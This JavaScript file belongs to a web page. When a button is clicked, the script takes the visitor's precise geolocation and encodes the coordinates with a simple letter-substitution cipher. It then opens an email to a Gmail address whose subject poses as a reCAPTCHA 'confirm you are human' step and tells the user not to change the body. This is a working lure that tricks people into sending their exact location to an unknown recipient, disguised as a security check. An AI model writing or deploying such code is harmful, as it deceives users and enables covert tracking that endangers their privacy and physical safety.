var form = document.getElementById('btn');
var x = document.getElementById('title');

function encrypt(coords, accuracy) {
    var key = {
        '0': 'A',
        '1': 'b',
        '2': 'C',
        '3': 'd',
        '4': 'E',
        '5': 'f',
        '6': 'W',
        '7': 'x',
        '8': 'Y',
        '9': 'z',
        '.': '.'
    };
    coords = coords.split(', ');
    accuracy = accuracy.split('')
    var lat = coords[0].split('');
    var lon = coords[1].split('');

    for (let i = 0; i < lat.length; i++) {
        lat[i] = key[lat[i]];
    }

    for (let i = 0; i < lon.length; i++) {
        lon[i] = key[lon[i]];
    }

    for (let i = 0; i < accuracy.length; i++) {
        accuracy[i] = key[accuracy[i]];
    }

    lat = lat.join('');
    lon = lon.join('');
    accuracy = accuracy.join('');
    return `${lat} ${lon} ${accuracy}`
}

form.addEventListener('click', function(e) {
    var options = {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 6000
    };
    
    function success(pos) {
        var crd = pos.coords;
    
        console.log('Your current position is:');
        console.log(`Latitude : ${crd.latitude}`);
        console.log(`Longitude: ${crd.longitude}`);
        console.log(`More or less ${crd.accuracy} meters.`);
        window.open(`mailto:recaptchabotdetector@gmail.com?subject=reCAPTCHA Confirmation: Confirm that you are human by sending this. WARNING: Do not change the body.&body=${encrypt(`${crd.latitude}, ${crd.longitude}`, `${crd.accuracy}`)}`)
    }
    
    function error(err) {
        console.warn(`ERROR(${err.code}): ${err.message}`)
        x.innerHTML = 'Failed Please Try Again';
    }
    
    navigator.geolocation.getCurrentPosition(success, error, options);
})